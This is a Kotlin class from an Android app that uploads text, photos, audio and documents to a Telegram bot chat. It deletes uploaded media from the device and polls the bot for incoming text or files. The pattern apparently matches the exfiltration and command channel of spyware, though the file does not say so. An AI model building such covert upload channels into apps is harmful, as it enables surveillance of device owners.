package com.systemlinker.features

import android.content.Context
import com.systemlinker.base.ErrorLogger
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

class TelegramUploader(
    private val context: Context,
    var botToken: String,
    var chatId: Long
) {
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private var lastPolledUpdateId = 0L

    suspend fun sendText(text: String) = withContext(Dispatchers.IO) {
        try {
            val url = "https://api.telegram.org/bot$botToken/sendMessage"
            val json = JSONObject().apply {
                put("chat_id", chatId)
                put("text", text)
                put("parse_mode", "Markdown")
            }
            val body = json.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
            val request = Request.Builder().url(url).post(body).build()
            client.newCall(request).execute().close()
        } catch (e: Exception) {
            ErrorLogger.logError(context, "TelegramUploader_Text", e)
        }
    }

    suspend fun sendFile(file: File, type: String, caption: String = "") = withContext(Dispatchers.IO) {
        try {
            if (!file.exists()) return@withContext
            val endpoint = if (type == "photo") "sendPhoto" else "sendAudio"
            val mediaType = if (type == "photo") "image/jpeg" else "audio/mp4"
            
            val fileBody = file.asRequestBody(mediaType.toMediaTypeOrNull())
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId.toString())
                .addFormDataPart("caption", caption)
                .addFormDataPart(type, file.name, fileBody)
                .build()

            val request = Request.Builder().url("https://api.telegram.org/bot$botToken/$endpoint").post(requestBody).build()
            client.newCall(request).execute().use { file.delete() }
        } catch (e: Exception) {
            ErrorLogger.logError(context, "TelegramUploader_File", e)
            file.delete()
        }
    }

    suspend fun sendDocument(file: File, caption: String = "", deleteAfter: Boolean = false) = withContext(Dispatchers.IO) {
        try {
            if (!file.exists()) return@withContext
            val fileBody = file.asRequestBody("text/plain".toMediaTypeOrNull())
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId.toString())
                .addFormDataPart("caption", caption)
                .addFormDataPart("document", file.name, fileBody)
                .build()

            val request = Request.Builder().url("https://api.telegram.org/bot$botToken/sendDocument").post(requestBody).build()
            client.newCall(request).execute().close()
            if (deleteAfter) file.delete()
        } catch (e: Exception) {
            ErrorLogger.logError(context, "TelegramUploader_Doc", e)
        }
    }

    suspend fun pollForFile(timeoutSeconds: Int, expectedType: String, destFile: File): Boolean = withContext(Dispatchers.IO) {
        val endTime = System.currentTimeMillis() + (timeoutSeconds * 1000)
        updateLastPollId()

        while (System.currentTimeMillis() < endTime) {
            try {
                val url = "https://api.telegram.org/bot$botToken/getUpdates?offset=${lastPolledUpdateId + 1}&timeout=5"
                val response = client.newCall(Request.Builder().url(url).build()).execute()
                val json = JSONObject(response.body?.string() ?: "{}")
                val results = json.optJSONArray("result")

                if (results != null && results.length() > 0) {
                    for (i in 0 until results.length()) {
                        val update = results.getJSONObject(i)
                        lastPolledUpdateId = update.getLong("update_id")
                        val message = update.optJSONObject("message") ?: continue

                        var fileId: String? = null
                        if (expectedType == "photo" && message.has("photo")) {
                            val photos = message.getJSONArray("photo")
                            fileId = photos.getJSONObject(photos.length() - 1).getString("file_id")
                        } else if (expectedType == "document" && message.has("document")) {
                            fileId = message.getJSONObject("document").getString("file_id")
                        }

                        if (fileId != null) return@withContext downloadTelegramFile(fileId, destFile)
                    }
                }
            } catch (e: Exception) { ErrorLogger.logError(context, "PollForFile", e) }
            delay(1000)
        }
        return@withContext false
    }
    
    suspend fun pollForText(timeoutSeconds: Int): String? = withContext(Dispatchers.IO) {
        val endTime = System.currentTimeMillis() + (timeoutSeconds * 1000)
        updateLastPollId()

        while (System.currentTimeMillis() < endTime) {
            try {
                val url = "https://api.telegram.org/bot$botToken/getUpdates?offset=${lastPolledUpdateId + 1}&timeout=5"
                val response = client.newCall(Request.Builder().url(url).build()).execute()
                val json = JSONObject(response.body?.string() ?: "{}")
                val results = json.optJSONArray("result")

                if (results != null && results.length() > 0) {
                    for (i in 0 until results.length()) {
                        val update = results.getJSONObject(i)
                        lastPolledUpdateId = update.getLong("update_id")
                        val message = update.optJSONObject("message") ?: continue
                        val text = message.optString("text", "").trim()
                        
                        if (text.isNotEmpty() && !text.startsWith("/")) {
                            return@withContext text
                        }
                    }
                }
            } catch (e: Exception) { ErrorLogger.logError(context, "PollForText", e) }
            delay(1000)
        }
        return@withContext null
    }

    private suspend fun updateLastPollId() {
        try {
            val url = "https://api.telegram.org/bot$botToken/getUpdates?offset=-1"
            val response = client.newCall(Request.Builder().url(url).build()).execute()
            val json = JSONObject(response.body?.string() ?: "{}")
            val results = json.optJSONArray("result")
            if (results != null && results.length() > 0) {
                lastPolledUpdateId = results.getJSONObject(0).getLong("update_id")
            }
        } catch (e: Exception) {}
    }

    private suspend fun downloadTelegramFile(fileId: String, destFile: File): Boolean {
        try {
            val getFileUrl = "https://api.telegram.org/bot$botToken/getFile?file_id=$fileId"
            val pathResponse = client.newCall(Request.Builder().url(getFileUrl).build()).execute()
            val pathJson = JSONObject(pathResponse.body?.string() ?: "{}")
            val filePath = pathJson.getJSONObject("result").getString("file_path")

            val downloadUrl = "https://api.telegram.org/file/bot$botToken/$filePath"
            val fileResponse = client.newCall(Request.Builder().url(downloadUrl).build()).execute()
            
            fileResponse.body?.byteStream()?.use { input ->
                FileOutputStream(destFile).use { output ->
                    input.copyTo(output)
                }
            }
            return true
        } catch (e: Exception) {
            ErrorLogger.logError(context, "DownloadTelegramFile", e)
            return false
        }
    }
}